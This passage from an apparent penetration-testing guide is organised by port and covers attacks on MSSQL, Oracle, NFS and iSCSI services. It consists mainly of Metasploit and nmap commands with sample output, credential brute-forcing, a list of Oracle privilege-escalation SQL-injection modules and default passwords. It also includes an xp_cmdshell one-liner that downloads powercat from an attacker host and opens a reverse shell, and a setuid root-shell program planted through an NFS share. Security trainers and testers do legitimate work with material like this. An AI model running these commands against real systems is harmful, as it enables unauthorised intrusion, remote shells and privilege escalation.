    [*]    EXAMPLE\Administrator
    [*]    OTH-EXAMPLE\altadmin
    [*]    NT SERVICE\SQLWriter
    [*]    NT SERVICE\Winmgmt
    [*]    NT Service\MSSQLSERVER
    [*]    NT AUTHORITY\SYSTEM
    [*]    NT SERVICE\SQLSERVERAGENT
    [*]    NT SERVICE\ReportServer
    [*] Disabled Accounts:
    [*]    ##MS_PolicyEventProcessingLogin##
    [*]    ##MS_PolicyTsqlExecutionLogin##
    [*] No Accounts Policy is set for:
    [*]    All System Accounts have the Windows Account Policy Applied to them.
    [*] Password Expiration is not checked for:
    [*]    sa
    [*]    ##MS_PolicyEventProcessingLogin##
    [*]    ##MS_PolicyTsqlExecutionLogin##
    [*] System Admin Logins on this Server:
    [*]    sa
    [*]    EXAMPLE\Administrator
    [*]    OTH-EXAMPLE\altadmin
    [*]    NT SERVICE\SQLWriter
    [*]    NT SERVICE\Winmgmt
    [*]    NT Service\MSSQLSERVER
    [*]    NT SERVICE\SQLSERVERAGENT
    [*] Windows Logins on this Server:
    [*]    EXAMPLE\Administrator
    [*]    OTH-EXAMPLE\altadmin
    [*]    NT SERVICE\SQLWriter
    [*]    NT SERVICE\Winmgmt
    [*]    NT Service\MSSQLSERVER
    [*]    NT AUTHORITY\SYSTEM
    [*]    NT SERVICE\SQLSERVERAGENT
    [*]    NT SERVICE\ReportServer
    [*] Windows Groups that can logins on this Server:
    [*]    No Windows Groups where found with permission to login to system.
    [*] Accounts with Username and Password being the same:
    [*]    No Account with its password being the same as its username was found.
    [*] Accounts with empty password:
    [*]    No Accounts with empty passwords where found.
    [*] Stored Procedures with Public Execute Permission found:
    [*]    sp_replsetsyncstatus
    [*]    sp_replcounters
    [*]    sp_replsendtoqueue
    [*]    sp_resyncexecutesql
    [*]    sp_prepexecrpc
    [*]    sp_repltrans
    [*]    sp_xml_preparedocument
    [*]    xp_qv
    [*]    xp_getnetname
    [*]    sp_releaseschemalock
    [*]    sp_refreshview
    [*]    sp_replcmds
    [*]    sp_unprepare
    [*]    sp_resyncprepare
    [*]    sp_createorphan
    [*]    xp_dirtree
    [*]    sp_replwritetovarbin
    [*]    sp_replsetoriginator
    [*]    sp_xml_removedocument
    [*]    sp_repldone
    [*]    sp_reset_connection
    [*]    xp_fileexist
    [*]    xp_fixeddrives
    [*]    sp_getschemalock
    [*]    sp_prepexec
    [*]    xp_revokelogin
    [*]    sp_resyncuniquetable
    [*]    sp_replflush
    [*]    sp_resyncexecute
    [*]    xp_grantlogin
    [*]    sp_droporphans
    [*]    xp_regread
    [*]    sp_getbindtoken
    [*]    sp_replincrementlsn
    [*] Instances found on this server:
    [*]    MSSQLSERVER
    [*]    SQLEXPRESS
    [*] Default Server Instance SQL Server Service is running under the privilege of:
    [*]    NT Service\MSSQLSERVER
    [*] Instance SQLEXPRESS SQL Server Service is running under the privilege of:
    [*]    NT AUTHORITY\NETWORKSERVICE
    [*] Auxiliary module execution completed
```
If the xp\_cmdshell is disabled and we have sa credentials, we can enable it by executing the below code in <a href="https://dbeaver.jkiss.org/" class="reference external">dbeaver</a> as mentioned in <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option" class="reference external">xp_cmdshell Server Configuration Option</a>

    -- To allow advanced options to be changed.
    EXEC sp_configure 'show advanced options', 1;
    GO
    -- To update the currently configured value for advanced options.
    RECONFIGURE;
    GO
    -- To enable the feature.
    EXEC sp_configure 'xp_cmdshell', 1;
    GO
    -- To update the currently configured value for this feature.
    RECONFIGURE;
    GO

Next, we can execute command using

### Microsoft SQL Server xp_cmdshell Command Execution

if xp_cmdshell is enabled and if the user has permissions.

    use auxiliary/admin/mssql/mssql_exec
    set RHOst 10.10.xx.xx
    set password company@123
    set cmd ipconfig

Sample Output:

    Windows IP Configuration


     Ethernet adapter LAN:

        Connection-specific DNS Suffix  . :
        IPv4 Address. . . . . . . . . . . : 10.10.xx.xx
        Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
        Default Gateway . . . . . . . . . : 10.10.xx.xx

      Ethernet adapter Local Area Connection 3:

        Connection-specific DNS Suffix  . :
        Link-local IPv6 Address . . . . . : fe80::798f:6cad:4f1e:c5fb%15
        Autoconfiguration IPv4 Address. . : 169.254.xx.xx
        Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
        Default Gateway . . . . . . . . . :

     Tunnel adapter isatap.{D295B095-19EB-436E-97D0-4D22486521CC}:

        Media State . . . . . . . . . . . : Media disconnected
        Connection-specific DNS Suffix  . :

     Tunnel adapter isatap.{A738E25A-F5E3-4E36-8F96-6977E22136B6}:

        Media State . . . . . . . . . . . : Media disconnected
        Connection-specific DNS Suffix  . :

At this point, we can probably use msf exploit/windows/mssql/mssql_payload or get a shell back with `powercat` or `powershell-empire`.

    EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/powercat.ps1");powercat -c 10.0.0.1 -p 443 -e cmd'

### Microsoft SQL Server SUSER\_SNAME Windows Domain Account Enumeration

    use auxiliary/admin/mssql/mssql_enum_domain_accounts
    set rhost 10.10.xx.xx
    set password company@123

Sample Output:
```
    [*] Attempting to connect to the database server at 10.10.xx.xx:1433 as sa...
    [+] Connected.
    [*] SQL Server Name: EXAMPLECRM1
    [*] Domain Name: EXAMPLE
    [+] Found the domain sid: 01050000000000051500000016c0ea32f450ba7443170a32
    [*] Brute forcing 10000 RIDs through the SQL Server, be patient...
    [*]  - EXAMPLE\administrator
    [*]  - EXAMPLE\Guest
    [*]  - EXAMPLE\krbtg
    [*]  - EXAMPLE\Domain Admins
    [*]  - EXAMPLE\Domain Users
    [*]  - EXAMPLE\Domain Guests
    [*]  - EXAMPLE\Domain Computers
    [*]  - EXAMPLE\Domain Controllers
    [*]  - EXAMPLE\Cert Publishers
    [*]  - EXAMPLE\Schema Admins
    [*]  - EXAMPLE\Enterprise Admins
    [*]  - EXAMPLE\Group Policy Creator Owners
    [*]  - EXAMPLE\Read-only Domain Controllers
    [*]  - EXAMPLE\RAS and IAS Servers
    [*]  - EXAMPLE\Allowed RODC Password Replication Group
    [*]  - EXAMPLE\Denied RODC Password Replication Group
    [*]  - EXAMPLE\TsInternetUser
```
Other fun modules to check are:

### Microsoft SQL Server Find and Sample Data

This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE\_SIZE option, and results output in a CSV format.

    use auxiliary/admin/mssql/mssql_findandsampledata

### Microsoft SQL Server Generic Query

Module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropriate credentials.

    use auxiliary/admin/mssql/mssql_sql

### MSSQL Schema Dump

Module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.

    use auxiliary/scanner/mssql/mssql_schemadump

## Other

We can also use:

### tsql

tsql command, install it by using freetds-bin package and use it like

    tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123
    locale is "en_IN"
    locale charset is "UTF-8"
    using default charset "UTF-8"
    1> SELECT suser_sname(owner_sid)
    2> FROM sys.databases
    3> go

    sa
    sa
    sa
    sa
    EXAMPLE\administrator
    EXAMPLE\administrator
    EXAMPLE\kuanxxxx
    (7 rows affected)

See examples for Scott blogs, how to execute queries.

### Microsoft SQL Server Management

Use Microsoft SQL Server Management tool to connect to Remote Database.

### Default MS-SQL System Tables

-   master Database : Records all the system-level information for an instance of SQL Server.
-   msdb Database : Is used by SQL Server Agent for scheduling alerts and jobs.
-   model Database : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterward.
-   Resource Database : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
-   tempdb Database : Is a workspace for holding temporary objects or intermediate result sets.

## Reference - Hacking SQL Server Stored Procedures

Scott Sutherland has written four parts of **Hacking SQL Servers**: (A must-read)

### Part 1: (un)Trustworthy Databases

<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/" class="reference external">Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db\_Owner ‘mssql\_escalate\_dbowner’.

### Part 2: User Impersonation

<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation%22" class="reference external">Hacking SQL Server Stored Procedures – Part 2: User Impersonation</a> : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS ‘mssql\_escalate\_execute\_as’.

### Part 3: SQL Injection

<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" class="reference external">Hacking SQL Server Stored Procedures – Part 3: SQL Injection</a> : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.

### Part 4: Enumerating Domain Accounts

<a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/" class="reference external">Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). It also shows how to enumerate SQL Server logins using a similar technique. Corresponding module is Microsoft SQL Server SUSER\_SNAME Windows Domain Account Enumeration

## References

### MSSQL-MITM

Rick Osgood has written a blog <a href="https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/" class="reference external">Hacking Microsoft SQL Server Without a Password</a> on doing a man-in-the-middle-attack between the SQL-Server and the user where he changed the select statement by using ettercap to add a new user in the mysql server.

### Others

-   <a href="https://blog.netspi.com/sql-server-local-authorization-bypass/" class="reference external">SQL Server Local Authorization Bypass</a>
-   <a href="https://blog.netspi.com/sql-server-local-authorization-bypass-msf-modules/" class="reference external">SQL Server Local Authorization Bypass MSF Modules</a>
-   <a href="https://blog.netspi.com/when-databases-attack-entry-points/" class="reference external">When Databases Attack: Entry Points</a>
-   <a href="https://blog.netspi.com/when-databases-attack-hacking-with-the-osql-utility/" class="reference external">When Databases Attack: Hacking with the OSQL Utility</a>
-   <a href="https://blog.netspi.com/when-databases-attack-sql-server-express-privilege-inheritance-issue/" class="reference external">When Databases Attack: SQL Server Express Privilege Inheritance Issue</a>
-   <a href="https://blog.netspi.com/when-databases-attack-finding-data-on-sql-servers/" class="reference external">When Databases Attack – Finding Data on SQL Servers</a>
-   <a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" class="reference external">Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures</a>


# Port 1521 - Oracle DB

After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux" class="reference external">How to get Oracle Support working with Kali Linux</a> We will directly follow the procedure presented by Chris Gates <a href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf" class="reference external">BHUSA09-Gates-OracleMetasploit-Slides</a>

## Oracle Attack Methodology

We need 4 things to connect to an Oracle DB.

-   IP.
-   Port.
-   Service Identifier (SID).
-   Username/ Password.

### Locate Oracle Systems

Nmap would probably be the best tool to find the oracle instances.

### Determine Oracle Version

**Metasploit** has

-   **Oracle TNS Listener Service Version Query**

     use auxiliary/scanner/oracle/tnslsnr_version
     services -p 1521 -u -R

Sample Output:
```
     [+] 10.10.xx.xx:1521 Oracle - Version: 64-bit Windows: Version 11.1.0.7.0 - Production
     [-] 10.10.xx.xx:1521 Oracle - Version: Unknown - Error code 1189 - The listener could not authenticate the user
     [-] 10.10.xx.xx:1521 Oracle - Version: Unknown
     [*] Scanned  8 of 12 hosts (66% complete)
     [+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production
```
### Determine Oracle SID

Oracle Service Identifier: By querying the TNS Listener directly, brute force for default SID’s or query other components that may contain it.

**Metasploit** has

-   **Oracle TNS Listener SID Enumeration**: This module simply queries the TNS listner for the Oracle SID. With Oracle 9.2.0.8 and above the listener will be protected and the SID will have to be bruteforced or guessed.

     use auxiliary/scanner/oracle/sid_enum

-   **Oracle TNS Listener SID Bruteforce**: This module queries the TNS listner for a valid Oracle database instance name (also known as a SID). Any response other than a “reject” will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise, SIDs read from the named file will be attempted in sequence instead.

     use auxiliary/scanner/oracle/sid_brute

 Sample Output:
```
     [*] 10.140.200.163:1521   -  - Oracle - Checking 'SA0'...
     [*] 10.140.200.163:1521   -  - Oracle - Refused 'SA0'
     [*] 10.140.200.163:1521   -  - Oracle - Checking 'PLSEXTPROC'...
     [+] 10.140.200.163:1521   - 10.140.200.163:1521 Oracle - 'PLSEXTPROC' is valid
```
**Nmap** has:

-   <a href="https://nmap.org/nsedoc/scripts/oracle-sid-brute.html" class="reference external">Oracle-sid-brute.nse</a> : Guesses Oracle instance/SID names against the TNS-listener.

     nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 <host>
     nmap --script=oracle-sid-brute -p 1521-1560 <host>

A good white paper on guessing the Service Identifier is <a href="http://www.dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf" class="reference external">Different ways to guess Oracle database SID</a>

### Guess/Brute force USER/PASS

Once we know the service identifier, we need to find out a valid username and password..

**Metasploit** has

-   **Oracle RDBMS Login Utility**: It actually runs nmap in the background, requires RHOSTS, RPORTS, SID to test the default usernames and passwords.

        use auxiliary/scanner/oracle/oracle_login

**Nmap** has

-   <a href="https://nmap.org/nsedoc/scripts/oracle-brute.html" class="reference external">oracle-brute.nse</a> Performs brute force password auditing against Oracle servers. Running it in default mode it performs an audit against a list of common Oracle usernames and passwords. The mode can be changed by supplying the argument oracle-brute.nodefault at which point the script will use the username- and password- lists supplied with Nmap. The script makes no attempt to discover the amount of guesses that can be made before locking an account. Running this script may therefor result in a large number of accounts being locked out on the database server.

        nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>

-   <a href="https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html" class="reference external">oracle-brute-stealth.nse</a> : Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle’s O5LOGIN authentication scheme. The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash. When initiating an authentication attempt as a valid user the server will respond with a session key and salt. Once received the script will disconnect the connection thereby not recording the login attempt. The session key and salt can then be used to brute force the users password.

    CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka “stealth password cracking vulnerability.

          nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL <host>

-   <a href="https://nmap.org/nsedoc/scripts/oracle-enum-users.html" class="reference external">Oracle-enum-users</a> : Attempts to enumerate valid Oracle user names against unpatched Oracle 11g servers (this bug was fixed in Oracle’s October 2009 Critical Patch Update).

        nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 <host>

### Privilege Escalation via SQL Injection

| Exploit | Description|
| :--- | :--- |
| lt\_findricset.rb | - |
| lt\_findricset\_cursor.rb | Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.LT.FINDRICSET package via Evil Cursor technique. Tested on oracle 10.1.0.3.0 – should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007. |
| dbms\_metadata\_open.rb | Oracle DB SQL Injection via SYS.DBMS\_METADATA.OPEN: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS\_METADATA.OPEN package/function |
| dbms\_cdc\_ipublish | Oracle DB SQL Injection via SYS.DBMS\_CDC\_IPUBLISH.ALTER\_HOTLOG\_INTERNAL\_CSOURCE: The module exploits an sql injection flaw in the ALTER\_HOTLOG\_INTERNAL\_CSOURCE procedure of the PL/SQL package. |
| DBMS\_CDC\_IPUBLISH | Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE\_CATALOG\_ROLE have the required privilege. Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU |
| dbms\_cdc\_publish | Oracle DB SQL Injection via SYS.DBMS\_CDC\_PUBLISH.ALTER\_AUTOLOG\_CHANGE\_SOURCE: The module exploits an sql injection flaw in the ALTER\_AUTOLOG\_CHANGE\_SOURCE procedure of the PL/SQL package. |
| DBMS\_CDC\_PUBLISH | Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE\_CATALOG\_ROLE have the required privilege. Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU |
| dbms\_cdc\_publish2 | Oracle DB SQL Injection via SYS.DBMS\_CDC\_PUBLISH.DROP\_CHANGE\_SOURCE: The module exploits an sql injection flaw in the DROP\_CHANGE\_SOURCE procedure of the PL/SQL package DBMS\_CDC\_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE\_CATALOG\_ROLE have the required privilege |
| dbms\_cdc\_publish3 | Oracle DB SQL Injection via SYS.DBMS\_CDC\_PUBLISH.CREATE\_CHANGE\_SET: The module exploits an sql injection flaw in the CREATE\_CHANGE\_SET procedure of the PL/SQL package DBMS\_CDC\_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE\_CATALOG\_ROLE have the required privilege |
| dbms\_cdc\_subscribe\_activate\_subscription | Oracle DB SQL Injection via SYS.DBMS\_CDC\_SUBSCRIBE.ACTIVATE\_SUBSCRIPTION: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS\_CDC\_SUBSCRIBE.ACTIVATE\_SUBSCRIPTION package/function. This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and 10g up to 10.1.0.4. |
| lt\_compressworkspace.rb | Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE: This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability|
| lt\_mergeworkspace.rb | Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE: This module exploits an sql injection flaw in the MERGEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability|
| lt\_removeworkspace.rb | Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE: This module exploits an sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability |
| lt\_rollbackworkspace.rb | Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE: This module exploits an sql injection flaw in the ROLLBACKWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability. |

### Manipulate Data/Post Exploitation

The above privilege escalation exploits will provide us DBA access, from where we can access the data. We can use

-   Metasploit oracle\_sql: Oracle SQL Generic Query: This module allows for simple SQL statements to be executed against a Oracle instance given the appropriate credentials and SID.

        use auxiliary/admin/oracle/oracle_sql

 Or you can directly connect to the database using:

-   `SQLPlus`

        sqlplus username/password@host:port/service

 Or use tnsnames.ora file to connect to the database. For that edit it and add a new entry: This file normally resides in the `$ORACLE HOMENETWORKADMIN` directory.

        myDb  =
        (DESCRIPTION =
          (ADDRESS_LIST =
            (ADDRESS = (PROTOCOL = TCP)(Host = c)(Port =a))
         )
        (CONNECT_DATA =
          (SERVICE_NAME =b)
        )
        )

 And then you could connect to the db:

      sqlplus x/y@myDb

 However, there’s more to Post Exploitation which are OS Shells. There are multiple methods for running OS commands via oracle libraries.

-   Via Java:

    There’s a metasploit

 -   win32exec: Oracle Java execCommand (Win32): This module will create a java class which enables the execution of OS commands. First, we need to grant the user privileges of JAVASYSPRIVS using oracle\_sql module

      use auxiliary/admin/oracle/post_exploitation/win32exec

 > This can also be done by executing SQL Scripts provided by oracle. For more information refer <a href="http://www.oracle.com/technetwork/database/enterprise-edition/calling-shell-commands-from-plsql-1-1-129519.pdf" class="reference external">Executing operating system commands from PL/ SQL</a>

 -   Extproc backdoors
 -   DBMS\_Scheduler

      Run custom pl/sql or java

**Metasploit** has

We can use **Oracle TNS Listener Checker** which module checks the server for vulnerabilities like TNS Poison.

        use auxiliary/scanner/oracle/tnspoison_checker
        services -p 1521 -u -R

 Sample Output:
```
     [+] 10.10.xx.xx:1521 is vulnerable
     [+] 10.10.xx.xx:1521 is vulnerable
     [*] Scanned  2 of 12 hosts (16% complete)
     [-] 10.10.xx.xx:1521 is not vulnerable
```
Some SQL statements which could be executed after SQL Plus connection:

        select * from global_name

## References

[http://www.red-database-security.com/wp/itu2007.pdf](http://www.red-database-security.com/wp/itu2007.pdf)
A good blog to secure oracle is <a href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html" class="reference external">Top 10 Oracle Steps to a Secure Oracle Database Server</a>

# Ports 1748/1754/1808/1809 - Oracle

These are also ports used by oracle on windows. They run Oracles **Intelligent Agent**.

# Port 2049 - NFS

Network file system  

We can scan the available exports

    $ showmount -e someexample.com
    Export list for someexample.com:
    /backup *

Now, let’s try to mount /backup and to get the content

    $ mkdir backup
    $ mount -o ro,noexec someexample.com:/backup backup
    $ ls backup
    backup.tar.bz2.zip

This is implemented by /etc/exports
```
    www-data@example2.com:/$ cat /etc/exports
    cat /etc/exports
    # /etc/exports: the access control list for filesystems which may be exported
    #              to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /tmp *(rw,no_root_squash)
    /var/nfsshare *(rw,sync,root_squash,no_all_squash)
    /opt *(rw,sync,root_squash,no_all_squash)
```
**Do Not Use the no\_root\_squash Option**

By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set. If no\_root\_squash is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.

**Do Not Use the no\_all\_squash Option**

The *no\_all\_squash* parameter is similar to *no\_root\_squash* option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

**Note** This is very dangerous if a) found on a linux box and b) you are unprivileged user on that linux box. Above we have mounted as read-only. However, we can mount as rw and copy a setuid program. Once suid file is uploaded, we can execute it and become that user.

```c
    int main(void) {
    setgid(0); setuid(0);
    execl(“/bin/sh”,”sh”,0); }
```
Compile it based on the architecture, give it setuid and executable permissions as root (Remember, we mounted as root)

    chown root.root ./pwnme
    chmod u+s ./pwnme

Further, if we are unprivileged user on that Linux box, we can just execute this binary to become root.

    www-data@xxxxxhostcus:/tmp$ ./pwnme
    ./pwnme
    # id
    id
    uid=0(root) gid=0(root) groups=0(root),33(www-data)

## nfsshell

As your uid and gid must be equivalent to the user, we are emulating to the nfs-share, we can use <a href="https://github.com/NetDirect/nfsshell" class="reference external">nfsshell</a> NFS shell that provides user level access to an NFS server, over UDP or TCP, supports source routing and “secure” (privileged port) mounts. It’s a useful tool to manually check (or show) security problems after a security scanner has detected them. Pentest Partners have published a blog on <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/" class="reference external">Using nfsshell to compromise older environments</a>

### Using nfsshell

-   Selecting the target, can either be the hostname (assuming you have name servers available to resolve against), or the IP address:

		host <host> – set remote host name

-   Show which shares the target has available:

		export – show all exported file systems

-   Try and mount them:

		mount [-upTU] [-P port] <path> – mount file system

-   Nfsshell is useful for accessing NFS shares without having to create users with the same UID/GID pair as the target exported filesystem. The following commands within nfsshell set the UID and GID:

		uid [<uid> [<secret-key>]] – set remote user id
		gid [<gid>] – set remote group id

-   Other important commands

		chmod <mode> <file> - change mode
		chown <uid>[.<gid>] <file> -  change owner
		put <local-file> [<remote-file>] - put file


# Port 2100 - Oracle XML DB

There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it.

Can be accessed through ftp.  
Some default passwords here:  
[https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)  
Name:  
Version:

Default logins:  
sys:sys  
scott:tiger

# Port 3260 - ISCSI

Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a href="https://pig.made-it.com/iSCSI.html" class="reference external">SCSI over IP</a>

## Nmap

### iscsi-info

<a href="https://nmap.org/nsedoc/scripts/iscsi-info.html" class="reference external">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.

Sample Output:

    nmap -sV -p 3260 192.168.xx.xx --script=iscsi-info

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-04 14:50 IST
    Nmap scan report for 192.168.xx.xx
    Host is up (0.00064s latency).
    PORT     STATE SERVICE VERSION
    3260/tcp open  iscsi?
    | iscsi-info:
    |   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe:
    |     Address: 192.168.xx.xx:3260,1
    |_    Authentication: NOT required
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds

## Other

### iscsiadm

Hacking Team DIY shows to run

We can discover the target IP address by using the below command

    iscsiadm -m discovery -t sendtargets -p 192.168.xx.xx
    192.168.xx.xx:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe

Login via

    iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -l -p 192.168.xx.xx --login -
    Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] (multiple)
    Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.

Failed Result: When we login, ideally we should be able to see the location, however for some strange reason we didn’t got that here.

    [43852.014179] scsi host6: iSCSI Initiator over TCP/IP
    [43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5
    [43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0

Sucessful Result: If we see, the drive is attached to sdb1

    [125933.964768] scsi host10: iSCSI Initiator over TCP/IP
    [125934.259637] scsi 10:0:0:0: Direct-Access     LIO-ORG  FILEIO           v2.  PQ: 0 ANSI: 2
    [125934.259919] sd 10:0:0:0: Attached scsi generic sg1 type 0
    [125934.266155] sd 10:0:0:0: [sdb] 2097152001 512-byte logical blocks: (1.07 TB/1000 GiB)
    [125934.266794] sd 10:0:0:0: [sdb] Write Protect is off
    [125934.266801] sd 10:0:0:0: [sdb] Mode Sense: 2f 00 00 00
    [125934.268003] sd 10:0:0:0: [sdb] Write cache: disabled, read cache: enabled, doesn't support DPO or FUA
    [125934.275206]  sdb: sdb1
    [125934.279017] sd 10:0:0:0: [sdb] Attached SCSI dis

We can logout using –logout

    iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 192.168.xx.xx --logout
    Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260]
    Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.

We can find more information about it by just using without any –login/–logout parameter

    iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 192.168.xx.xx
    # BEGIN RECORD 2.0-873
    node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
    node.tpgt = 1
    node.startup = manual
    node.leading_login = No
    iface.hwaddress = <empty>
    iface.ipaddress = <empty>
    iface.iscsi_ifacename = default
    iface.net_ifacename = <empty>
    iface.transport_name = tcp
    iface.initiatorname = <empty>
    iface.bootproto = <empty>
    iface.subnet_mask = <empty>
    iface.gateway = <empty>
    iface.ipv6_autocfg = <empty>
    iface.linklocal_autocfg = <empty>
    iface.router_autocfg = <empty>
    iface.ipv6_linklocal = <empty>
    iface.ipv6_router = <empty>
    iface.state = <empty>
    iface.vlan_id = 0
    iface.vlan_priority = 0
    iface.vlan_state = <empty>
    iface.iface_num = 0
    iface.mtu = 0
    iface.port = 0
    node.discovery_address = 192.168.xx.xx
    node.discovery_port = 3260
    node.discovery_type = send_targets
    node.session.initial_cmdsn = 0
    node.session.initial_login_retry_max = 8
    node.session.xmit_thread_priority = -20
    node.session.cmds_max = 128
    node.session.queue_depth = 32
    node.session.nr_sessions = 1
    node.session.auth.authmethod = None
    node.session.auth.username = <empty>
    node.session.auth.password = <empty>
    node.session.auth.username_in = <empty>
    node.session.auth.password_in = <empty>
    node.session.timeo.replacement_timeout = 120
    node.session.err_timeo.abort_timeout = 15
